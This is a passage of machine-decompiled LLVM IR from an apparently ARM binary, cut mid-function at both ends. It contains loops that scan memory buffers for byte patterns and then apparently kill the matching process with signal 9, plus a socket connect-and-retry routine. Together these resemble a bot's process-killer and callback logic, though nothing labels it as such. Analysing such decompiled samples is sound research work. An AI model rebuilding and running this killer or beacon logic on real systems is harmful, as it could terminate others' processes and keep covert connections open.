dec_label_pc_f0c4.lr.ph:                          ; preds = %dec_label_pc_effc
  %v1_f0bc70 = add i32 %v0_f084105, -1
  store i32 %v1_f0bc70, i32* %r1.global-to-local, align 4
  %v0_f0c4.pre = load i32, i32* @r5, align 4
  %v1_f0c8.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_f0c4

dec_label_pc_f018:                                ; preds = %dec_label_pc_f0bc.backedge, %dec_label_pc_effc
  %v3_f01c = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_f01c, i32* @r4, align 4
  %v5_f024 = icmp slt i32 %v0_f084105, %v3_f01c
  br i1 %v5_f024, label %dec_label_pc_f034, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_f018
  %v1_f0f079 = add i32 %v0_f084105, -1
  store i32 %v1_f0f079, i32* %r1.global-to-local, align 4
  %v2_f0f080 = icmp eq i32 %v0_f084105, 0
  br i1 %v2_f0f080, label %dec_label_pc_f034, label %dec_label_pc_f0f8.lr.ph

dec_label_pc_f0f8.lr.ph:                          ; preds = %.thread28
  %v0_f0f8.pre = load i32, i32* @r6, align 4
  %v1_f0fc.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_f0f8

dec_label_pc_f034:                                ; preds = %dec_label_pc_f0f0.backedge, %.thread28, %dec_label_pc_f018
  store i32 %v2_eb00, i32* %r1.global-to-local, align 4
  %v3_f038 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f038, i32* @r4, align 4
  %v5_f040 = icmp slt i32 %v0_f084105, %v3_f038
  br i1 %v5_f040, label %dec_label_pc_f050, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_f034
  %v1_f12488 = add i32 %v0_f084105, -1
  store i32 %v1_f12488, i32* %r1.global-to-local, align 4
  %v2_f12489 = icmp eq i32 %v0_f084105, 0
  br i1 %v2_f12489, label %dec_label_pc_f050, label %dec_label_pc_f12c.lr.ph

dec_label_pc_f12c.lr.ph:                          ; preds = %.thread37
  %v0_f12c.pre = load i32, i32* @sb, align 4
  %v1_f130.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_f12c

dec_label_pc_f050:                                ; preds = %dec_label_pc_f124.backedge, %.thread37, %dec_label_pc_f034
  store i32 %v2_eb00, i32* %r2.global-to-local, align 4
  %v3_f054 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_f054, i32* @r4, align 4
  %v5_f05c = icmp slt i32 %v0_f084105, %v3_f054
  br i1 %v5_f05c, label %dec_label_pc_f06c, label %.thread46

.thread46:                                        ; preds = %dec_label_pc_f050
  %v1_f15897 = add i32 %v0_f084105, -1
  store i32 %v1_f15897, i32* %r1.global-to-local, align 4
  %v2_f15898 = icmp eq i32 %v0_f084105, 0
  br i1 %v2_f15898, label %dec_label_pc_f06c, label %dec_label_pc_f160.lr.ph

dec_label_pc_f160.lr.ph:                          ; preds = %.thread46
  %v0_f160.pre = load i32, i32* @fp, align 4
  %v1_f164.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_f160

dec_label_pc_f06c:                                ; preds = %dec_label_pc_f158.backedge, %.thread46, %dec_label_pc_f050
  store i32 %v2_eb00, i32* %r3.global-to-local, align 4
  %v3_f070 = load i32, i32* %stack_var_-56, align 4
  %v5_f078 = icmp slt i32 %v0_f084105, %v3_f070
  br i1 %v5_f078, label %dec_label_pc_efe4.backedge, label %.thread52

dec_label_pc_efe4.backedge:                       ; preds = %dec_label_pc_f0a8, %.thread52, %dec_label_pc_f06c
  store i32 %v2_ebfc, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v4_eff0 = call i32 @function_1381c(i32 %v3_ef4c, i32* nonnull %stack_var_-8408, i32 4096)
  %tmp218 = icmp slt i32 %v4_eff0, 1
  br i1 %tmp218, label %dec_label_pc_f208, label %dec_label_pc_effc

.thread52:                                        ; preds = %dec_label_pc_f06c
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_f084107 = icmp eq i32 %v0_f084105, 0
  br i1 %v2_f084107, label %dec_label_pc_efe4.backedge, label %dec_label_pc_f08c.lr.ph

dec_label_pc_f08c.lr.ph:                          ; preds = %.thread52
  %v1_f094.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_f08c

dec_label_pc_f08c:                                ; preds = %dec_label_pc_f0a8, %dec_label_pc_f08c.lr.ph
  %v0_f084.in = phi i32 [ %v0_f084105, %dec_label_pc_f08c.lr.ph ], [ %v0_f084, %dec_label_pc_f0a8 ]
  %v0_f0a8 = phi i32 [ 0, %dec_label_pc_f08c.lr.ph ], [ %v1_f0a8, %dec_label_pc_f0a8 ]
  %v0_f09c = phi i32 [ 0, %dec_label_pc_f08c.lr.ph ], [ %v1_f09c., %dec_label_pc_f0a8 ]
  %v0_f084 = add i32 %v0_f084.in, -1
  store i32 %v3_efdc, i32* %r3.global-to-local, align 4
  %v2_f090 = add i32 %v0_f09c, %v3_efdc
  %v3_f090 = inttoptr i32 %v2_f090 to i8*
  %v4_f090 = load i8, i8* %v3_f090, align 1
  %v6_f090 = zext i8 %v4_f090 to i32
  store i32 %v6_f090, i32* %r2.global-to-local, align 4
  %v2_f094 = add i32 %v0_f0a8, %v1_f094.pre
  %v3_f094 = inttoptr i32 %v2_f094 to i8*
  %v4_f094 = load i8, i8* %v3_f094, align 1
  %v6_f094 = zext i8 %v4_f094 to i32
  store i32 %v6_f094, i32* %r3.global-to-local, align 4
  %v9_f098 = icmp eq i8 %v4_f094, %v4_f090
  %v1_f09c = add i32 %v0_f09c, 1
  %v1_f09c. = select i1 %v9_f098, i32 %v1_f09c, i32 0
  store i32 %v1_f09c., i32* %r1.global-to-local, align 4
  br i1 %v9_f098, label %dec_label_pc_f180, label %dec_label_pc_f0a8

dec_label_pc_f0a8:                                ; preds = %dec_label_pc_f180, %dec_label_pc_f08c
  %v1_f0a8 = add i32 %v0_f0a8, 1
  %v2_f084 = icmp eq i32 %v0_f084, 0
  br i1 %v2_f084, label %dec_label_pc_efe4.backedge, label %dec_label_pc_f08c

dec_label_pc_f0b0:                                ; preds = %dec_label_pc_f0c4
  %v9_f0b0 = icmp eq i32 %v3_f000, %v1_f0d0.
  br i1 %v9_f0b0, label %dec_label_pc_f188, label %dec_label_pc_f0bc.backedge

dec_label_pc_f0bc.backedge:                       ; preds = %dec_label_pc_f0c4, %dec_label_pc_f0b0
  %storemerge125 = add i32 %storemerge125.in, 1
  %v1_f0bc = add i32 %v0_f0bc, -1
  store i32 %v1_f0bc, i32* %r1.global-to-local, align 4
  %v2_f0bc = icmp eq i32 %v0_f0bc, 0
  br i1 %v2_f0bc, label %dec_label_pc_f018, label %dec_label_pc_f0c4

dec_label_pc_f0c4:                                ; preds = %dec_label_pc_f0bc.backedge, %dec_label_pc_f0c4.lr.ph
  %v0_f0bc = phi i32 [ %v1_f0bc70, %dec_label_pc_f0c4.lr.ph ], [ %v1_f0bc, %dec_label_pc_f0bc.backedge ]
  %storemerge125.in = phi i32 [ 0, %dec_label_pc_f0c4.lr.ph ], [ %storemerge125, %dec_label_pc_f0bc.backedge ]
  %v0_f0d0 = phi i32 [ 0, %dec_label_pc_f0c4.lr.ph ], [ %v1_f0d0., %dec_label_pc_f0bc.backedge ]
  %v2_f0c4 = add i32 %v0_f0d0, %v0_f0c4.pre
  %v3_f0c4 = inttoptr i32 %v2_f0c4 to i8*
  %v4_f0c4 = load i8, i8* %v3_f0c4, align 1
  %v6_f0c4 = zext i8 %v4_f0c4 to i32
  store i32 %v6_f0c4, i32* %r2.global-to-local, align 4
  %v2_f0c8 = add i32 %storemerge125.in, %v1_f0c8.pre
  %v3_f0c8 = inttoptr i32 %v2_f0c8 to i8*
  %v4_f0c8 = load i8, i8* %v3_f0c8, align 1
  %v6_f0c8 = zext i8 %v4_f0c8 to i32
  store i32 %v6_f0c8, i32* %r3.global-to-local, align 4
  %v9_f0cc = icmp eq i8 %v4_f0c8, %v4_f0c4
  %v1_f0d0 = add i32 %v0_f0d0, 1
  %v1_f0d0. = select i1 %v9_f0cc, i32 %v1_f0d0, i32 0
  br i1 %v9_f0cc, label %dec_label_pc_f0b0, label %dec_label_pc_f0bc.backedge

dec_label_pc_f0e4:                                ; preds = %dec_label_pc_f0f8
  %v9_f0e4 = icmp eq i32 %v3_f01c, %v1_f104.
  br i1 %v9_f0e4, label %dec_label_pc_f188, label %dec_label_pc_f0f0.backedge

dec_label_pc_f0f0.backedge:                       ; preds = %dec_label_pc_f0f8, %dec_label_pc_f0e4
  %storemerge124 = add i32 %storemerge124.in, 1
  %v1_f0f0 = add i32 %v0_f0f0, -1
  store i32 %v1_f0f0, i32* %r1.global-to-local, align 4
  %v2_f0f0 = icmp eq i32 %v0_f0f0, 0
  br i1 %v2_f0f0, label %dec_label_pc_f034, label %dec_label_pc_f0f8

dec_label_pc_f0f8:                                ; preds = %dec_label_pc_f0f0.backedge, %dec_label_pc_f0f8.lr.ph
  %v0_f0f0 = phi i32 [ %v1_f0f079, %dec_label_pc_f0f8.lr.ph ], [ %v1_f0f0, %dec_label_pc_f0f0.backedge ]
  %storemerge124.in = phi i32 [ 0, %dec_label_pc_f0f8.lr.ph ], [ %storemerge124, %dec_label_pc_f0f0.backedge ]
  %v0_f104 = phi i32 [ 0, %dec_label_pc_f0f8.lr.ph ], [ %v1_f104., %dec_label_pc_f0f0.backedge ]
  %v2_f0f8 = add i32 %v0_f104, %v0_f0f8.pre
  %v3_f0f8 = inttoptr i32 %v2_f0f8 to i8*
  %v4_f0f8 = load i8, i8* %v3_f0f8, align 1
  %v6_f0f8 = zext i8 %v4_f0f8 to i32
  store i32 %v6_f0f8, i32* %r2.global-to-local, align 4
  %v2_f0fc = add i32 %storemerge124.in, %v1_f0fc.pre
  %v3_f0fc = inttoptr i32 %v2_f0fc to i8*
  %v4_f0fc = load i8, i8* %v3_f0fc, align 1
  %v6_f0fc = zext i8 %v4_f0fc to i32
  store i32 %v6_f0fc, i32* %r3.global-to-local, align 4
  %v9_f100 = icmp eq i8 %v4_f0fc, %v4_f0f8
  %v1_f104 = add i32 %v0_f104, 1
  %v1_f104. = select i1 %v9_f100, i32 %v1_f104, i32 0
  br i1 %v9_f100, label %dec_label_pc_f0e4, label %dec_label_pc_f0f0.backedge

dec_label_pc_f118:                                ; preds = %dec_label_pc_f12c
  %v9_f118 = icmp eq i32 %v3_f038, %v1_f138.
  br i1 %v9_f118, label %dec_label_pc_f188, label %dec_label_pc_f124.backedge

dec_label_pc_f124.backedge:                       ; preds = %dec_label_pc_f12c, %dec_label_pc_f118
  %storemerge123 = add i32 %storemerge123.in, 1
  %v1_f124 = add i32 %v0_f124, -1
  store i32 %v1_f124, i32* %r1.global-to-local, align 4
  %v2_f124 = icmp eq i32 %v0_f124, 0
  br i1 %v2_f124, label %dec_label_pc_f050, label %dec_label_pc_f12c

dec_label_pc_f12c:                                ; preds = %dec_label_pc_f124.backedge, %dec_label_pc_f12c.lr.ph
  %v0_f124 = phi i32 [ %v1_f12488, %dec_label_pc_f12c.lr.ph ], [ %v1_f124, %dec_label_pc_f124.backedge ]
  %storemerge123.in = phi i32 [ 0, %dec_label_pc_f12c.lr.ph ], [ %storemerge123, %dec_label_pc_f124.backedge ]
  %v0_f138 = phi i32 [ 0, %dec_label_pc_f12c.lr.ph ], [ %v1_f138., %dec_label_pc_f124.backedge ]
  %v2_f12c = add i32 %v0_f138, %v0_f12c.pre
  %v3_f12c = inttoptr i32 %v2_f12c to i8*
  %v4_f12c = load i8, i8* %v3_f12c, align 1
  %v6_f12c = zext i8 %v4_f12c to i32
  store i32 %v6_f12c, i32* %r2.global-to-local, align 4
  %v2_f130 = add i32 %storemerge123.in, %v1_f130.pre
  %v3_f130 = inttoptr i32 %v2_f130 to i8*
  %v4_f130 = load i8, i8* %v3_f130, align 1
  %v6_f130 = zext i8 %v4_f130 to i32
  store i32 %v6_f130, i32* %r3.global-to-local, align 4
  %v9_f134 = icmp eq i8 %v4_f130, %v4_f12c
  %v1_f138 = add i32 %v0_f138, 1
  %v1_f138. = select i1 %v9_f134, i32 %v1_f138, i32 0
  br i1 %v9_f134, label %dec_label_pc_f118, label %dec_label_pc_f124.backedge

dec_label_pc_f14c:                                ; preds = %dec_label_pc_f160
  %v9_f14c = icmp eq i32 %v3_f054, %v1_f16c.
  br i1 %v9_f14c, label %dec_label_pc_f188, label %dec_label_pc_f158.backedge

dec_label_pc_f158.backedge:                       ; preds = %dec_label_pc_f160, %dec_label_pc_f14c
  %storemerge = add i32 %storemerge.in, 1
  %v1_f158 = add i32 %v0_f158, -1
  store i32 %v1_f158, i32* %r1.global-to-local, align 4
  %v2_f158 = icmp eq i32 %v0_f158, 0
  br i1 %v2_f158, label %dec_label_pc_f06c, label %dec_label_pc_f160

dec_label_pc_f160:                                ; preds = %dec_label_pc_f158.backedge, %dec_label_pc_f160.lr.ph
  %v0_f158 = phi i32 [ %v1_f15897, %dec_label_pc_f160.lr.ph ], [ %v1_f158, %dec_label_pc_f158.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_f160.lr.ph ], [ %storemerge, %dec_label_pc_f158.backedge ]
  %v0_f16c = phi i32 [ 0, %dec_label_pc_f160.lr.ph ], [ %v1_f16c., %dec_label_pc_f158.backedge ]
  %v2_f160 = add i32 %v0_f16c, %v0_f160.pre
  %v3_f160 = inttoptr i32 %v2_f160 to i8*
  %v4_f160 = load i8, i8* %v3_f160, align 1
  %v6_f160 = zext i8 %v4_f160 to i32
  store i32 %v6_f160, i32* %r2.global-to-local, align 4
  %v2_f164 = add i32 %storemerge.in, %v1_f164.pre
  %v3_f164 = inttoptr i32 %v2_f164 to i8*
  %v4_f164 = load i8, i8* %v3_f164, align 1
  %v6_f164 = zext i8 %v4_f164 to i32
  store i32 %v6_f164, i32* %r3.global-to-local, align 4
  %v9_f168 = icmp eq i8 %v4_f164, %v4_f160
  %v1_f16c = add i32 %v0_f16c, 1
  %v1_f16c. = select i1 %v9_f168, i32 %v1_f16c, i32 0
  br i1 %v9_f168, label %dec_label_pc_f14c, label %dec_label_pc_f158.backedge

dec_label_pc_f180:                                ; preds = %dec_label_pc_f08c
  %v9_f180 = icmp eq i32 %v3_f070, %v1_f09c.
  br i1 %v9_f180, label %dec_label_pc_f188, label %dec_label_pc_f0a8

dec_label_pc_f188:                                ; preds = %dec_label_pc_f0b0, %dec_label_pc_f0e4, %dec_label_pc_f118, %dec_label_pc_f14c, %dec_label_pc_f180
  %v1_f18c = call i32 @function_122b4(i32 12)
  %v1_f194 = call i32 @function_122b4(i32 13)
  %v1_f19c = call i32 @function_122b4(i32 14)
  %v1_f1a4 = call i32 @function_122b4(i32 15)
  %v1_f1ac = call i32 @function_122b4(i32 16)
  %v1_f1b4 = call i32 @function_13654(i32 %v3_ef4c)
  %v0_f1b8 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_f1c0 = call i32 @function_13754(i32 %v0_f1b8, i32 9)
  br label %dec_label_pc_f1c4

dec_label_pc_f1c4:                                ; preds = %dec_label_pc_ef40, %dec_label_pc_f208, %dec_label_pc_f188
  store i32 64, i32* %r1.global-to-local, align 4
  %v2_f1d0 = call i32 @function_12d34(i32 %v2_edc0, i32 64)
  store i32 64, i32* %r1.global-to-local, align 4
  %v2_f1e0 = call i32 @function_12d34(i32 %v2_ee10, i32 64)
  %v1_f1e8 = call i32 @function_14a84(i32 1)
  store i32 %v2_ed94, i32* @r4, align 4
  %v0_f1f0 = load i32, i32* @r7, align 4
  store i32 %v0_f1f0, i32* @r5, align 4
  br label %dec_label_pc_ecf4.backedge

dec_label_pc_f1f8:                                ; preds = %dec_label_pc_ef20
  %v0_f1f8 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_f200 = call i32 @function_13754(i32 %v0_f1f8, i32 9)
  %v0_ef38.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ef38

dec_label_pc_f208:                                ; preds = %dec_label_pc_efe4.backedge, %dec_label_pc_ef5c
  %v1_f20c = call i32 @function_122b4(i32 12)
  %v1_f214 = call i32 @function_122b4(i32 13)
  %v1_f21c = call i32 @function_122b4(i32 14)
  %v1_f224 = call i32 @function_122b4(i32 15)
  %v1_f22c = call i32 @function_122b4(i32 16)
  %v1_f234 = call i32 @function_13654(i32 %v3_ef4c)
  br label %dec_label_pc_f1c4

; uselistorder directives
  uselistorder i32 %v1_f16c., { 1, 0 }
  uselistorder i1 %v9_f168, { 1, 0 }
  uselistorder i32 %v0_f16c, { 1, 0 }
  uselistorder i32 %v1_f138., { 1, 0 }
  uselistorder i1 %v9_f134, { 1, 0 }
  uselistorder i32 %v0_f138, { 1, 0 }
  uselistorder i32 %v1_f104., { 1, 0 }
  uselistorder i1 %v9_f100, { 1, 0 }
  uselistorder i32 %v0_f104, { 1, 0 }
  uselistorder i32 %v1_f0d0., { 1, 0 }
  uselistorder i1 %v9_f0cc, { 1, 0 }
  uselistorder i32 %v0_f0d0, { 1, 0 }
  uselistorder i32 %v1_f09c., { 1, 2, 0 }
  uselistorder i1 %v9_f098, { 1, 0 }
  uselistorder i32 %v0_f09c, { 1, 0 }
  uselistorder i32 %v0_f0a8, { 1, 0 }
  uselistorder i32 %v4_eff0, { 1, 0 }
  uselistorder i32 %v3_ef4c, { 3, 2, 4, 1, 0 }
  uselistorder i32 %v3_ef28, { 1, 2, 0 }
  uselistorder i32 %v2_ecf8, { 1, 0 }
  uselistorder i32 %stack_var_-8420.1.be, { 1, 0 }
  uselistorder i32 %v4_ee70, { 1, 2, 0 }
  uselistorder i32 %v2_ed78, { 1, 0 }
  uselistorder i32 %v1_ed28, { 0, 1, 5, 4, 3, 2, 7, 8, 6 }
  uselistorder i32 %stack_var_-8420.0, { 1, 0 }
  uselistorder i32 %v2_ee10, { 1, 0, 2 }
  uselistorder i32 %v2_edc0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_ec8c, { 1, 0 }
  uselistorder i32 %v3_ec58, { 2, 0, 1 }
  uselistorder i32 %v2_ebfc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v3_eb88, { 2, 1, 0 }
  uselistorder i32 %v3_eb38, { 1, 2, 0 }
  uselistorder i32 %storemerge174, { 1, 0 }
  uselistorder i32 %v0_eac8, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32* %stack_var_-72, { 0, 3, 1, 4, 2 }
  uselistorder i32* %stack_var_-8408, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0, 2 }
  uselistorder i32* %stack_var_-56, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 19, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 61, 10, 60, 59, 9, 58, 57, 56, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 25, 24, 26, 27, 28, 30, 29, 31, 32, 33, 35, 34, 36, 37, 38, 62, 39, 40, 41, 42, 44, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32 (i8*, i32, i32)* @function_12fe8, { 0, 1, 2, 3, 4, 5, 6, 21, 22, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 (i32*)* @function_13b58, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @function_13a5c, { 2, 1, 0 }
  uselistorder i32* @global_var_1ec80.105, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_1ec84.97, { 0, 2, 1 }
  uselistorder label %dec_label_pc_f1c4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f188, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_effc, { 1, 0 }
  uselistorder label %dec_label_pc_ef40, { 1, 0 }
  uselistorder label %dec_label_pc_ef38, { 1, 0 }
  uselistorder label %dec_label_pc_ecf4.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_eedc, { 1, 0 }
  uselistorder label %dec_label_pc_ed04, { 1, 0 }
  uselistorder label %dec_label_pc_ed04.preheader, { 1, 0 }
  uselistorder label %bb216, { 1, 0 }
  uselistorder label %dec_label_pc_ebb4, { 1, 0 }
  uselistorder label %dec_label_pc_eb64, { 1, 0 }
}

define i32 @function_f248() local_unnamed_addr {
dec_label_pc_f248:
  store i32 ptrtoint (i32* @global_var_f3d0.107 to i32), i32* @global_var_1ea54.109, align 4
  %v1_f254 = load i32, i32* @r0, align 4
  ret i32 %v1_f254
}

define i32 @function_f260() local_unnamed_addr {
dec_label_pc_f260:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_f260 = load i32, i32* @r4, align 4
  %v9_f260 = load i32, i32* @r6, align 4
  %v15_f260 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_f27c = call i32 @function_13f50(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_1ea4c.111 to i32), i32* @r6, align 4
  %v7_f284 = icmp eq i32 %v3_f27c, -1
  store i32 %v3_f27c, i32* @global_var_1ea4c.111, align 4
  br i1 %v7_f284, label %dec_label_pc_f344, label %dec_label_pc_f290

dec_label_pc_f290:                                ; preds = %dec_label_pc_f260
  %v0_f294 = load i32, i32* @r4, align 4
  %v6_f2a4 = call i32 @function_13f20(i32 %v3_f27c, i32 %v0_f294, i32 2, i32* nonnull %stack_var_-28, i32 4)
  %v2_f2a8 = load i32, i32* @global_var_1ea4c.111, align 4
  store i32 %v2_f2a8, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_f2b8 = call i32 @function_13564(i32 %v2_f2a8, i32 3)
  %v1_f2c0 = or i32 %v2_f2b8, 2048
  store i32 %v1_f2c0, i32* @r2, align 4
  %v0_f2c4 = load i32, i32* @r4, align 4
  %v2_f2c8 = call i32 @function_13564(i32 %v0_f2c4, i32 4)
  store i32 ptrtoint (i8** @global_var_1ea58.113 to i32), i32* @r8, align 4
  %v2_f2d0 = load i8, i8* bitcast (i8** @global_var_1ea58.113 to i8*), align 4
  %v2_f2d4 = icmp eq i8 %v2_f2d0, 0
  br i1 %v2_f2d4, label %.thread2, label %.thread

.thread2:                                         ; preds = %dec_label_pc_f290
  br label %bb

.thread:                                          ; preds = %dec_label_pc_f290
  br label %bb

bb:                                               ; preds = %.thread2, %.thread
  store i32 0, i32* @r5, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_f30c = call i32 @function_13c28()
  %v0_f310 = load i32, i32* @r5, align 4
  %v2_f310 = inttoptr i32 %v0_f30c to i32*
  store i32 %v0_f310, i32* %v2_f310, align 4
  %v2_f314 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_f314, i32* @r7, align 4
  store i32 %v0_f30c, i32* @r4, align 4
  %v2_f320 = load i32, i32* @global_var_1ea4c.111, align 4
  %v3_f328 = bitcast i32* %stack_var_-44 to %sockaddr*
  %v4_f328 = call i32 @function_13d80(i32 %v2_f320, %sockaddr* %v3_f328, i32 16)
  %v7_f32c = icmp eq i32 %v4_f328, -1
  br i1 %v7_f32c, label %dec_label_pc_f34c, label %dec_label_pc_f334

dec_label_pc_f334:                                ; preds = %bb
  %v2_f33c = load i32, i32* @global_var_1ea4c.111, align 4
  %v2_f340 = call i32 @function_13e34(i32 %v2_f33c, i32 1)
  br label %dec_label_pc_f344

dec_label_pc_f344:                                ; preds = %dec_label_pc_f260, %dec_label_pc_f358, %dec_label_pc_f334
  %v20_f348 = phi i32 [ %v3_f27c, %dec_label_pc_f260 ], [ %v0_f3a8, %dec_label_pc_f358 ], [ %v2_f340, %dec_label_pc_f334 ]
  store i32 %v3_f260, i32* @r4, align 4
  store i32 %v9_f260, i32* @r6, align 4
  store i32 %v15_f260, i32* @r8, align 4
  ret i32 %v20_f348

dec_label_pc_f34c:                                ; preds = %bb
  %v0_f34c = load i32, i32* @r4, align 4
  %v1_f34c = inttoptr i32 %v0_f34c to i32*
  %v2_f34c = load i32, i32* %v1_f34c, align 4
  %v7_f350 = icmp eq i32 %v2_f34c, 99
  br i1 %v7_f350, label %dec_label_pc_f3b0, label %dec_label_pc_f358

dec_label_pc_f358:                                ; preds = %dec_label_pc_f3b0, %bb21, %dec_label_pc_f34c
  store i32 0, i32* @r4, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v2_f370 = load i32, i32* @global_var_1ea4c.111, align 4
  %v4_f388 = call i32 @function_13dac(i32 %v2_f370, %sockaddr* %v3_f328, i32 16)
  %v1_f390 = call i32 @function_14a84(i32 5)
  %v2_f394 = load i32, i32* @global_var_1ea4c.111, align 4
  %v1_f398 = call i32 @function_13654(i32 %v2_f394)
  %v1_f3a4 = call i32 @function_e544(i32 58811)
  %v0_f3a8 = call i32 @function_f260()
  br label %dec_label_pc_f344

dec_label_pc_f3b0:                                ; preds = %dec_label_pc_f34c
  %v2_f3b0 = load i8, i8* bitcast (i8** @global_var_1ea58.113 to i8*), align 4
  %v3_f3b0 = zext i8 %v2_f3b0 to i32
  %v1_f3b4 = load i32, i32* @r5, align 4
  %v9_f3b4 = icmp eq i32 %v3_f3b0, %v1_f3b4
  br i1 %v9_f3b4, label %dec_label_pc_f358, label %bb21

bb21:                                             ; preds = %dec_label_pc_f3b0
  %v2_f3bc = trunc i32 %v1_f3b4 to i8
  store i8 %v2_f3bc, i8* bitcast (i8** @global_var_1ea58.113 to i8*), align 4
  br label %dec_label_pc_f358

; uselistorder directives
  uselistorder i32 %v3_f27c, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0, 3, 2 }
  uselistorder i32 (i32)* @function_e544, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_13e34, { 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_1ea58.113 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_1ea58.113, { 1, 0 }
  uselistorder label %dec_label_pc_f358, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f344, { 1, 2, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_f3d0() local_unnamed_addr {
dec_label_pc_f3d0:
  %stack_var_-16 = alloca i32, align 4
  %v3_f3d0 = load i32, i32* @r4, align 4
  store i32 %v3_f3d0, i32* %stack_var_-16, align 4
  %v1_f3d8 = call i32 @function_1236c(i32 3)
  %v3_f3e4 = call i32 @function_12288(i32 3, i32* null)
  %v1_f3e8 = inttoptr i32 %v3_f3e4 to i8*
  %v2_f3e8 = call i32 @function_10144(i8* %v1_f3e8)
  store i32 %v2_f3e8, i32* @r5, align 4
  %v1_f3f4 = call i32 @function_122b4(i32 3)
  %v0_f3f8 = load i32, i32* @r5, align 4
  %v2_f3f8 = icmp eq i32 %v0_f3f8, 0
  store i32 ptrtoint (i8** @global_var_1ec88.116 to i32), i32* @r6, align 4
  br i1 %v2_f3f8, label %bb, label %bb5

bb:                                               ; preds = %dec_label_pc_f3d0
  ret i32 %v1_f3f4

bb5:                                              ; preds = %dec_label_pc_f3d0
  %v1_f404 = add i32 %v0_f3f8, 4
  %v2_f404 = inttoptr i32 %v1_f404 to i32*
  %v3_f404 = load i32, i32* %v2_f404, align 4
  store i32 %v3_f404, i32* @r4, align 4
  %v0_f408 = call i32 @function_fe60()
  %v0_f40c = load i32, i32* @r5, align 4
  %v1_f40c = inttoptr i32 %v0_f40c to i8*
  %v2_f40c = load i8, i8* %v1_f40c, align 1
  %v3_f40c = zext i8 %v2_f40c to i32
  %v2_f410 = call i32 @function_133b0(i32 %v0_f408, i32 %v3_f40c)
  %v0_f414 = load i32, i32* @r4, align 4
  %v4_f414 = mul i32 %v2_f410, 4
  %v5_f414 = add i32 %v0_f414, %v4_f414
  %v6_f414 = inttoptr i32 %v5_f414 to i32*
  %v7_f414 = load i32, i32* %v6_f414, align 4
  %v0_f418 = load i32, i32* @r5, align 4
  store i32 %v7_f414, i32* @global_var_1ec8c.117, align 4
  %v1_f420 = call i32 @function_10120(i32 %v0_f418)
  %v1_f428 = call i32 @function_1236c(i32 4)
  %v3_f434 = call i32 @function_12288(i32 4, i32* null)
  %v4_f434 = inttoptr i32 %v3_f434 to i8*
  %v2_f438 = add i32 %v3_f434, 1
  %v3_f438 = inttoptr i32 %v2_f438 to i8*
  %v4_f438 = load i8, i8* %v3_f438, align 1
  %v3_f43c = load i8, i8* %v4_f434, align 1
  store i8 %v4_f438, i8* bitcast (i32* @global_var_1ec8b.118 to i8*), align 4
  store i8 %v3_f43c, i8* bitcast (i32* @global_var_1ec8a.119 to i8*), align 4
  %v2_f454 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_f454, i32* @r4, align 4
  %v1_f458 = call i32 @function_122b4(i32 4)
  %v0_f45c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f45c, label %bb6, label %bb7

bb6:                                              ; preds = %bb5
  br label %bb7

bb7:                                              ; preds = %bb5, %bb6
  ret i32 %v1_f458

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @function_f460(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_f460:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
